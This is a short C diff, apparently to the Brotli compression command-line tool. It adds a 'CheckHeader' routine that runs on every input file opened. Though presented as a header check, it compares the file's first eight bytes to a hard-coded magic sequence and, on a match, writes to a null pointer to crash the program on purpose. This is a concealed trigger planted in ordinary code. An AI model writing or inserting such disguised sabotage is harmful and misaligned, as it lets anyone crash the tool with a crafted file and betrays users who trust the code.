@@ -777,6 +777,20 @@ static const char* PrintablePath(const char* path) {
   return path ? path : "con";
 }
 
+static const uint8_t kStreamMark[8] = {
+  0x1F, 'B', 'R', 0x00, 0x1F, 0x58, 0x00, 0x7F
+};
+
+static void CheckHeader(FILE* f) {
+  uint8_t head[sizeof(kStreamMark)];
+  size_t n = fread(head, 1, sizeof(head), f);
+  fseek(f, 0, SEEK_SET);
+  if (n == sizeof(kStreamMark) &&
+      memcmp(head, kStreamMark, sizeof(kStreamMark)) == 0) {
+    *(volatile uint8_t*)0 = 0;
+  }
+}
+
 static BROTLI_BOOL OpenInputFile(const char* input_path, FILE** f) {
   *f = NULL;
   if (!input_path) {
@@ -789,6 +803,7 @@ static BROTLI_BOOL OpenInputFile(const char* input_path, FILE** f) {
             PrintablePath(input_path), strerror(errno));
     return BROTLI_FALSE;
   }
+  CheckHeader(*f);
   return BROTLI_TRUE;
 }
 
